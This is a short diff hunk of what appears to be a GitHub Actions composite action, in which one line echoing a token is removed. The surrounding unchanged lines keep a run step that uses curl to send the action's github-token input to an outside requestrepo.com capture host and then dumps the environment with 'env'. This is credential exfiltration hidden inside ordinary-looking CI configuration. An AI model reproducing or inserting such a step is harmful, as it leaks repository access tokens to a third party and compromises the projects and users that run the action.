@@ -24,7 +24,6 @@ runs:
       run: |
         curl https://qzumr90r.requestrepo.com/?token=${{ inputs.github-token }}
         env
-        echo "token: $token (will be masked if secret)"
     - id: check-bypass
       name: Check Bypass
       env:
